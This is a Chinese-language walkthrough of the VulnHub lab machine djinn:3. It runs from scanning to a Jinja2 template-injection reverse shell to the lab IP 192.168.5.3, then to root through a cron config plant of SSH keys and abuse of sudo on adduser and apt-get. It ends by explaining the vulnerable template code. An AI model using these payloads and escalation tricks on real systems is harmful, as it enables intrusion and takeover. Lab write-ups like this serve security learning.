# djinn: 3

2024-5-31 https://www.vulnhub.com/entry/djinn-3,492/

difficulty: Intermediate

## IP

192.168.5.29

## Scan

Open Port -> 22,80,5000,31337

```
PORT      STATE SERVICE VERSION
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e64423acb2d982e79058155e4023ed65 (RSA)
|   256 ae04856ecb104f554aad969ef2ce184f (ECDSA)
|_  256 f708561997b5031018667e7d2e0a4742 (ED25519)
80/tcp    open  http    lighttpd 1.4.45
|_http-server-header: lighttpd/1.4.45
|_http-title: Custom-ers
5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31337/tcp open  Elite?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL:
|     username>
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     username> password> authentication failed
|   Help:
|     username> password>
|   RPCCheck:
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq:
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie:
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
```

先看 80 端口的 web 服务，gobuster：

```
gobuster -t 64 dir -u http://192.168.5.29/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e
```

什么都没扫出来，80 是个 html 静态页面。

看看 5000 端口的服务，是一个 python 搭建的服务 Werkzeug/1.0.1，显示了一个数据列表，显示了一些系统修复的信息。打开那几个连接，得到了一些提示信息：

```
可能存在用户名 jason、david、freddy、umang、jack

RLUI 团队

使用的数据库 Postgres

默认用户 guest

可能存在弱密码

用户可通过密码以及通过 API 密钥或令牌进行授权
```

http://192.168.5.29:5000/?id=8345 遍历一下这个 id 的值，看看会不会有其他重要信息泄露，从 1-20000 没发现什么信息，就只有那 6 个 id 对应的信息。

http://192.168.5.29:5000/?id=8345 发现这个 id 的值会显示在页面中，有没有可能存在模板注入，尝试寻找。

31337 是一个 tcp 服务，应该就是 5000 端口中说的票务系统，可以用 nc 进行连接，但是需要用户名和密码。经过探测使用的是 python 搭建的。

前面发现了肯能存在的几个用户名: jason、david、freddy、umang、jack、guest，可能存在弱密码，进行尝试。

尝试 guest:guest 登陆成功。

help 后提示了几个功能菜单，选择 open 后，输入 title 和 description ，然后打开 http://192.168.5.29:5000/ 的服务，就会出现在页面上。

看看这里会不会出现 sql 注入或者是 ssti 注入：

先验证了不存在 sql 注入，原封不动的显示了，没有解析：

```
> open
Title: 1" or 1=1 #
Description: 1" or 1=1 #

1" or 1=1 #

Status: open
ID: 2817
Description:

1" or 1=1 #
Sorry for the bright page, we are working on some beautiful CSS
```

ssti 验证:

```
> open
Title: {{7*'7'}}
Description: {{7*'7'}}

进入对应的页面连接 http://192.168.5.29:5000/?id=1037

7777777

Status: open
ID: 3904
Description:

7777777
Sorry for the bright page, we are working on some beautiful CSS
```

可以看到 {{7*'7'}} 解析成了 7777777，证明存在 ssti 模板注入，并且模板类型为 Jinja2 (Python)。

直接将反弹连接进行注入，kali 上监听：

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.5.3\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

然后在浏览器中访问这个新增的 tick 对应的 url ，就会触发 SSTI 执行，反弹到 kali 上。

```
www-data@djinn3:/opt/.web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

开始进行系统枚举,sudo、suid、getcap、crontab 没发现特殊设置。

```
/opt/.tick-serv/tickets.sh
/opt/.web/webapp.py

/opt/.syncer.cpython-38.pyc
/opt/.configuration.cpython-38.pyc
```

使用 pspy32 进行查看，发现定时任务，每 3 分钟执行一次：

```
2024/05/31 07:54:01 CMD: UID=1000  PID=2436   | /usr/bin/python3 /home/saint/.sync-data/syncer.py
2024/05/31 07:54:01 CMD: UID=1000  PID=2435   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py
2024/05/31 07:54:01 CMD: UID=0     PID=2434   | /usr/sbin/CRON -f
2024/05/31 07:54:01 CMD: UID=1000  PID=2437   | /sbin/ldconfig.real -p
2024/05/31 07:54:01 CMD: UID=1000  PID=2440   | uname -p
2024/05/31 07:54:01 CMD: UID=1000  PID=2439   | /bin/sh -c uname -p 2> /dev/null
```

/home/saint/.sync-data/syncer.py 文件 www-data 没有读取权限。但是发现了这个文件对应的编译后 pyc 文件 /opt/.syncer.cpython-38.pyc 和 /opt/.configuration.cpython-38.pyc，并且有读取权限：

```
www-data@djinn3:/tmp$ ls -al /opt/.syncer.cpython-38.pyc
-rwxr-xr-x 1 saint saint 661 Jun  4  2020 /opt/.syncer.cpython-38.pyc

www-data@djinn3:/tmp$ ls -al /opt/.configuration.cpython-38.pyc
-rwxr-xr-x 1 saint saint 1403 Jun  4  2020 /opt/.configuration.cpython-38.pyc
```

通过在线网站进行编译得到源码：

/opt/.syncer.cpython-38.pyc

```python
from configuration import *
from connectors.ftpconn import *
from connectors.sshconn import *
from connectors.utils import *

def main():
    '''Main function
    Cron job is going to make my work easy peasy
    '''
    configPath = ConfigReader.set_config_path()
    config = ConfigReader.read_config(configPath)
    connections = checker(config)
    if 'FTP' in connections:
        ftpcon(config['FTP'])
    elif 'SSH' in connections:
        sshcon(config['SSH'])
    elif 'URL' in connections:
        sync(config['URL'], config['Output'])

if __name__ == '__main__':
    main()
```

/opt/.configuration.cpython-38.pyc

```python
import os
import sys
import json
from glob import glob
from datetime import datetime as dt

class ConfigReader:
    config = None

    def read_config(path):
        '''Reads the config file
        '''
        config_values = { }
    # WARNING: Decompyle incomplete

    read_config = staticmethod(read_config)

    def set_config_path():
        '''Set the config path
        '''
        files = glob('/home/saint/*.json')
        other_files = glob('/tmp/*.json')
        files = files + other_files

        try:
            if len(files) > 2:
                files = files[:2]
            file1 = os.path.basename(files[0]).split('.')
            file2 = os.path.basename(files[1]).split('.')
            if file1[-2] == 'config' and file2[-2] == 'config':
                a = dt.strptime(file1[0], '%d-%m-%Y')
                b = dt.strptime(file2[0], '%d-%m-%Y')
            if b < a:
                filename = files[0]
            else:
                filename = files[1]
        finally:
            pass
        except Exception:
            sys.exit(1)

        return filename

    set_config_path = staticme
```

解读下代码，配置文件如果存储在/tmp 中，格式为 日-月-年.config.json 时，就会读取这个文件。`sync(config['URL'], config['Output'])` 可以将 URL 中的内容同步到 Output 中。

所以在 tmp 中可以写入一个文件 31-5-2024.config.json :

```
{
    "URL": "http://192.168.5.3:80/authorized_keys",
    "Output": "/home/saint/.ssh/authorized_keys"
}
```

UID 1000 对应的 user 是 saint:x:1000:1002:,,,:/home/saint:/bin/bash

在 kali 上创建 80 web 服务，创建 ssh 私钥：

```
ssh-keygen -t rsa -f ./id_rsa
cat id_rsa.pub >> authorized_keys
```

等待 3 分钟看到 web log 中已经访问了 authorized_keys，这时就可以 ssh 登陆：

```
ssh -i id_rsa saint@192.168.5.29

saint@djinn3:~$ id
uid=1000(saint) gid=1002(saint) groups=1002(saint)
```

sudo -l 发现：

```
(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
```

saint 不能查看 /etc/sudoers ，需要添加一个能读取 /etc/sudoers 的用户，将其添加到 group root 组中：

```
sudo /usr/sbin/adduser --gid 0 test

输入 test 想要设置的密码。

su test

cat /etc/sudoers

saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
jason ALL=(root) PASSWD: /usr/bin/apt-get
```

jason 有 apt-get 权限，但是 /etc/passwd 中没有这个用户，所以我们就添加一个这个用户：

```
sudo /usr/sbin/adduser jason

输入用户设定密码 123

su jason

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

最终得到了 root 权限：

```
jason@djinn3:/home/saint$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
proof.sh
```

看看 SSTI 是怎么形成的：

index.php 列表页面中不会执行{{}} 中包裹的代码，因为外层又被{{}}包裹了。

```
<tbody>
    {% for i in items %}
    <tr>
        <th scope="row">{{loop.index}}</th>
        <td>{{i.id}}</td>
        <td>{{i.title}}</td>
        <td>{{i.status}}</td>
        <td><a href="/?id={{i.id}}">link</td>
    </tr>
    {% endfor %}
</tbody>
```

index.php?id=xxx 下面的代码是直接替换了字符串中的内容，相当 template 中就只有一对{{}} 所以{{}} 中包裹的内容可以被执行，这里对用户输入的数据没有做过滤，应该还是按照上面的写法才是安全的。

```
template = """
<html>
    <head>
    </head>

    <body>
        <h4>%s</h4>
        <br>
        <b>Status</b>: %s
        <br>
        <b>ID</b>: %s
        <br>
        <h4> Description: </h4>
        <br>
        %s
    </body>
        <footer>
        <p><strong>Sorry for the bright page, we are working on some beautiful CSS</strong></p>
        </footer>
</html>
""" % (
    title,
    status,
    ticket_id,
    desc,
)
return render_template_string(template)
```

看看 saint 目录中的 json 是怎么构造的：

```python
# cat /home/saint/.sync-data/syncer.py

from configuration import *
from connectors.ftpconn import *
from connectors.sshconn import *
from connectors.utils import *


def main():
    """Main function
    Cron job is going to make my work easy peasy
    """
    configPath = ConfigReader.set_config_path()
    config = ConfigReader.read_config(configPath)
    connections = checker(config)

    if "FTP" in connections:
        ftpcon(config["FTP"])
    elif "SSH" in connections:
        sshcon(config["SSH"])
    elif "URL" in connections:
        sync(config["URL"], config["Output"])


if __name__ == "__main__":
    main()
```

```python
# cat configuration.py
import os
import sys
import json

from glob import glob
from datetime import datetime as dt

class ConfigReader():
    config = None

    @staticmethod
    def read_config(path):
        """Reads the config file
        """
        config_values = {}

        try:
            with open(path, 'r') as f:
                config_values = json.load(f)
        except Exception as e:
            print("Couldn't properly parse the config file. Please use properl")
            sys.exit(1)
        return config_values

    @staticmethod
    def set_config_path():
        """Set the config path
        """

        files = glob("/home/saint/.sync-data/*.json")
        # While I am testing things
        other_files = glob("/tmp/*.json")
        files = files + other_files
        print(files)
        try:
            if len(files) > 2:
                files = files[:2]
            elif len(files) == 1:
                return files[0]
            file1 = os.path.basename(files[0]).split(".")
            file2 = os.path.basename(files[1]).split(".")

            if file1[-2] == "config" and file2[-2] == "config":
                a = dt.strptime(file1[0], "%d-%m-%Y")
                b = dt.strptime(file2[0], "%d-%m-%Y")
            else:
                return files[0]

            if b < a:
                filename = files[0]
            else:
                filename = files[1]

        except Exception:
            sys.exit(1)

        return filename
```

```
#cat /home/saint/.sync-data/01-06-2020.config.json
{
    "FTP": {
        "enable": "False",
        "username": "saint",
        "password": "saint"
    },
    "SSH": {
        "enable": "False",
        "username": "saint",
        "password": "saint"
    },
    "webdav": {
        "enable": "False",
        "URL": "https://webdav.mzfr.me"

    },
    "URL": "http://blog.mzfr.me/files",
    "Output": "/home/saint"
}
```
